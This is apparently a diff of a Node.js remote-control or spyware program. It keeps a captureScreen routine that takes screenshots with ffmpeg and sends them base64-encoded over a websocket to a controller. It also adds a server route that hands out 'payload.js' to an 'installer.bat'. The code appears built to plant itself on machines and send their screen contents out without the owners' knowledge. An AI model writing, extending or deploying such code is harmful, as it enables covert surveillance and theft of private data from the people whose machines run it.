@@ -106,18 +106,18 @@ function captureScreen() {
     exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
         // If avfoundation fails, this fallback ensures no crash
         if (err && !fs.existsSync(imgPath)) {
-             // Try macOS specific if needed
-             exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
-                 if (!err2 && fs.existsSync(imgPath)) {
-                     const img = fs.readFileSync(imgPath);
-                     // FIX: Stringify the object before sending
-                     ws.send(JSON.stringify({
-                         type: 'screen_data',
-                         id: myId,
-                         data: img.toString('base64')
-                     }));
-                 }
-             });
+            // Try macOS specific if needed
+            exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
+                if (!err2 && fs.existsSync(imgPath)) {
+                    const img = fs.readFileSync(imgPath);
+                    // FIX: Stringify the object before sending
+                    ws.send(JSON.stringify({
+                        type: 'screen_data',
+                        id: myId,
+                        data: img.toString('base64')
+                    }));
+                }
+            });
         } else if (!err && fs.existsSync(imgPath)) {
             const img = fs.readFileSync(imgPath);
             // FIX: Stringify the object before sending
@@ -186,20 +186,36 @@ function keepAlive() {
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
-    // Health check endpoint for Render
-    if (req.url === '/health') {
+    // 1. Serve the payload.js file itself (for installer.bat)
+    if (req.url === '/payload.js') {
+        res.writeHead(200, { 'Content-Type': 'application/javascript' });
+        res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
+    } 
+    // 2. Serve index.html if it exists (for frontend)
+    else if (req.url === '/' || req.url === '/index.html') {
+        const indexPath = path.join(__dirname, 'index.html');
+        if (fs.existsSync(indexPath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(fs.readFileSync(indexPath));
+        } else {
+            res.writeHead(404);
+            res.end('index.html not found');
+        }
+    }
+    // 3. Health Check
+    else if (req.url === '/health') {
         res.writeHead(200, { 'Content-Type': 'text/plain' });
         res.end('OK');
-        return;
+    } 
+    // 4. Default response
+    else {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ 
+            status: 'running', 
+            id: myId || 'pending_connection',
+            timestamp: new Date().toISOString()
+        }));
     }
-
-    // Basic response for root or other paths
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ 
-        status: 'running', 
-        id: myId || 'pending_connection',
-        timestamp: new Date().toISOString()
-    }));
 });
 
 server.listen(PORT, () => {
